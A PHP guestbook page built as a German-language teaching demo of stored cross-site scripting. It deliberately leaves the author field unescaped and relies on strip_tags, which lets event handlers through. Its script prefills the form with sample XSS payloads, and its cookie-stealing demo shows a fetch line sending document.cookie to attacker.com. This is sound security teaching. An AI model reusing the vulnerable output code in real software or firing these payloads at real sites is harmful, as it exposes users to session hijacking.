<?php

error_reporting(E_ALL);

// add the class-name of your Guestbook implementation 
$GB_CLASS_IMPL = 'GuestbookDemoImpl';
require_once $GB_CLASS_IMPL . '.php';

require_once 'Guestbook.php';
require_once 'GuestbookEntry.php';

$gb = new $GB_CLASS_IMPL;
$entries = getEntries($gb);

function getEntries(Guestbook $gb) {
    return $gb->getAllEntries();
}

?>
<!DOCTYPE html>
<html lang="de">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Guestbook - XSS Demo</title>
        <link rel="stylesheet" href="guestbook.css">
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>📝 Guestbook</h1>
                <p class="implementation-info">Implementation: <?php echo get_class($gb); ?></p>
            </div>

            <div class="main-layout">
                <div class="left-column">
                    <div class="source-code-section">
                        <button onclick="toggleSourceCode(); return false;" class="btn-source-code">📄 Quellcode anzeigen</button>
                    </div>
                    <div class="entries-container">

            <?php
            foreach ($entries as $e) {
                $msg = strip_tags($e->getMessage(), '<b><p><u><i>'); // <u onmouseover="javascrip:alert('xss attack');">Lorem ipsum ...</u>
                $author = $e->getAuthor(); // <script>alert('xss attack');</script>
                $email = htmlspecialchars($e->getEmail());
                $date = htmlspecialchars($e->getEntryDate());
                echo <<<EOT
                <div class="gbentry">
                    <div class="gbentry-message">$msg</div>
                    <div class="gbentry-meta">
                        <span class="gbentry-author">$author</span>
                        <span class="gbentry-email">&lt;$email&gt;</span>
                        <span class="gbentry-date">$date</span>
                    </div>
                </div>
EOT;
            }
            ?>
                    </div>
                </div>

                <div class="right-column">
                    <div class="demo-section">
                <h3>🔒 XSS Demo Links</h3>
                <p class="demo-description">Klicken Sie auf einen der folgenden Links, um vorgefertigte Formulareinträge auszuwählen und verschiedene XSS-Angriffe zu testen:</p>
                <div class="demo-links">
                    <a href="clearsession.php" class="demo-link reset">Angriffsdaten löschen</a>
                    <a href="#" onclick="xssAttackName(); return false;" class="demo-link">
                        <div class="demo-link-content">
                            <div class="demo-link-title">XSS Username</div>
                            <div class="xss-type-badge stored">Stored XSS</div>
                        </div>
                        <span class="attack-status success">Erfolgreich</span>
                    </a>
                    <a href="#" onclick="xssAttackMessageStripOk(); return false;" class="demo-link">
                        <div class="demo-link-content">
                            <div class="demo-link-title">XSS Message (strip_tags OK)</div>
                            <div class="xss-type-badge stored">Stored XSS</div>
                        </div>
                        <span class="attack-status blocked">Verhindert</span>
                    </a>
                    <a href="#" onclick="xssAttackMessageStripFail(); return false;" class="demo-link">
                        <div class="demo-link-content">
                            <div class="demo-link-title">XSS Message (strip_tags FAIL)</div>
                            <div class="xss-type-badge stored">Stored XSS</div>
                        </div>
                        <span class="attack-status success">Erfolgreich</span>
                    </a>
                    <a href="#" onclick="xssAttackMessageStripHtmlSCIsSafe(); return false;" class="demo-link">
                        <div class="demo-link-content">
                            <div class="demo-link-title">XSS htmlspecialchars is safe</div>
                            <div class="xss-type-badge stored">Stored XSS</div>
                        </div>
                        <span class="attack-status blocked">Verhindert</span>
                    </a>
                    <a href="#" onclick="xssAttackCookieStealing(); return false;" class="demo-link">
                        <div class="demo-link-content">
                            <div class="demo-link-title">Cookie Stealing</div>
                            <div class="xss-type-badge stored">Stored XSS - Advanced</div>
                        </div>
                        <span class="attack-status success">Erfolgreich</span>
                    </a>
                </div>
                    </div>

                    <div class="form-section">
                <h2>Neuer Eintrag</h2>
                <form action="add.php" method="post" name="gbform" accept-charset="utf-8">
                    <div class="form-group">
                        <label for="yourname">
                            Name <span class="security-note">(unsafe)</span>
                        </label>
                        <input type="text" name="yourname" id="yourname" maxlength="255" class="form-control" />
                    </div>

                    <div class="form-group">
                        <label for="email">
                            Email <span class="security-note">(htmlspecialchars)</span>
                        </label>
                        <input type="text" name="email" id="email" maxlength="255" class="form-control" />
                    </div>

                    <div class="form-group">
                        <label for="message">
                            Nachricht <span class="security-note">(strip_tags($msg, '&lt;b&gt;&lt;p&gt;&lt;u&gt;&lt;i&gt;'))</span>
                        </label>
                        <textarea name="message" id="message" class="form-control"></textarea>
                    </div>

                    <div class="form-buttons">
                        <button type="submit" class="btn btn-primary">Absenden</button>
                        <button type="reset" class="btn btn-secondary">Zurücksetzen</button>
                    </div>
                </form>
                    </div>
                </div>
            </div>
        </div>

        <!-- Source Code Modal -->
        <div id="sourceCodeModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2>📄 Guestbook Quellcode (index.php)</h2>
                    <span class="close" onclick="toggleSourceCode()">&times;</span>
                </div>
                <div class="modal-body">
                    <p class="source-explanation">Kritische Stellen sind farblich hervorgehoben:</p>
                    <pre class="source-code"><code><span class="code-comment">// Zeile 40-44: Ausgabe der Gästebucheinträge</span>
foreach ($entries as $e) {
    <span class="code-unsafe">$msg = strip_tags($e->getMessage(), '&lt;b&gt;&lt;p&gt;&lt;u&gt;&lt;i&gt;');</span>  <span class="code-comment">// ⚠️ TEILWEISE UNSICHER!</span>
    <span class="code-unsafe">$author = $e->getAuthor();</span>  <span class="code-comment">// ❌ UNSICHER - Kein Escaping!</span>
    <span class="code-safe">$email = htmlspecialchars($e->getEmail());</span>  <span class="code-comment">// ✓ SICHER</span>
    <span class="code-safe">$date = htmlspecialchars($e->getEntryDate());</span>  <span class="code-comment">// ✓ SICHER</span>
    echo "&lt;div class='gbentry'&gt;";
    echo "  &lt;div class='gbentry-message'&gt;<span class="code-unsafe">$msg</span>&lt;/div&gt;";
    echo "  &lt;div class='gbentry-meta'&gt;";
    echo "    &lt;span&gt;<span class="code-unsafe">$author</span>&lt;/span&gt;";  <span class="code-comment">// ❌ XSS möglich!</span>
    echo "    &lt;span&gt;$email&lt;/span&gt;";
    echo "  &lt;/div&gt;";
    echo "&lt;/div&gt;";
}

<span class="code-comment">// Probleme:</span>
<span class="code-comment">// 1. $author wird NICHT escaped → XSS möglich</span>
<span class="code-comment">// 2. strip_tags() entfernt Tags, aber NICHT Event-Handler wie onmouseover</span>
<span class="code-comment">// 3. Erlaubte Tags (&lt;u&gt;, &lt;i&gt;, etc.) können für XSS missbraucht werden</span>

<span class="code-comment">// Lösung:</span>
<span class="code-safe">$author = htmlspecialchars($e->getAuthor());</span>  <span class="code-comment">// ✓ Macht es sicher!</span>
<span class="code-safe">$msg = htmlspecialchars($e->getMessage());</span>  <span class="code-comment">// ✓ Alternative: Alles escapen</span></code></pre>
                </div>
            </div>
        </div>

        <script>
            function toggleSourceCode() {
                var modal = document.getElementById('sourceCodeModal');
                if (modal.style.display === 'block') {
                    modal.style.display = 'none';
                } else {
                    modal.style.display = 'block';
                }
            }

            // Close modal when clicking outside
            window.onclick = function(event) {
                var modal = document.getElementById('sourceCodeModal');
                if (event.target == modal) {
                    modal.style.display = 'none';
                }
            }

            function xssAttackName() {
                document.forms.gbform.elements.yourname.value = "<script>alert('XSS im Namen!');<\/script>";
                document.forms.gbform.elements.email.value = "angreifer@example.com";
                document.forms.gbform.elements.message.value = "Erfolgreiche XSS-Angriff (Typ 2 / persistent) über das Namen-Feld. Das Script-Tag wird direkt ausgeführt, da der Name NICHT escaped wird!";
            }
            function xssAttackMessageStripOk() {
                document.forms.gbform.elements.yourname.value = "Harmloser User";
                document.forms.gbform.elements.email.value = "user@example.com";
                document.forms.gbform.elements.message.value = "Versuch: XSS über Nachricht mit <script>alert('XSS');<\/script> - Wird durch strip_tags() entfernt und ist daher SICHER.";
            }
            function xssAttackMessageStripFail() {
                document.forms.gbform.elements.yourname.value = "Cleverer Angreifer";
                document.forms.gbform.elements.email.value = "hacker@example.com";
                document.forms.gbform.elements.message.value = "<u onmouseover=\"javascript:alert('XSS via Event-Handler!');\">Fahre mit der Maus über diesen Text!<\/u> Das <u>-Tag ist erlaubt, aber strip_tags() entfernt NICHT die Event-Handler wie onmouseover!";
            }
            function xssAttackMessageStripHtmlSCIsSafe() {
                document.forms.gbform.elements.yourname.value = "Erfolgloser Angreifer";
                document.forms.gbform.elements.email.value = "test@example.com <script>alert('XSS');<\/script>";
                document.forms.gbform.elements.message.value = "Versuch: XSS über Email-Feld. htmlspecialchars() wandelt < und > in HTML-Entities um, daher ist dies SICHER.";
            }
            function xssAttackCookieStealing() {
                document.forms.gbform.elements.yourname.value = "<script>alert('Cookie Stealing Demo:\\n\\nCookies: ' + document.cookie + '\\n\\nIn einem echten Angriff würden diese Daten an einen Angreifer-Server gesendet:\\nfetch(\\'http://attacker.com/steal.php?c=\\' + document.cookie)');<\/script>";
                document.forms.gbform.elements.email.value = "advanced-attacker@evil.com";
                document.forms.gbform.elements.message.value = "ADVANCED: Cookie-Stealing Angriff. In einem echten Szenario würde das Script die Session-Cookies des Opfers an einen Angreifer-Server senden. Dies ermöglicht Session Hijacking!";
            }
        </script>
    </body>
</html>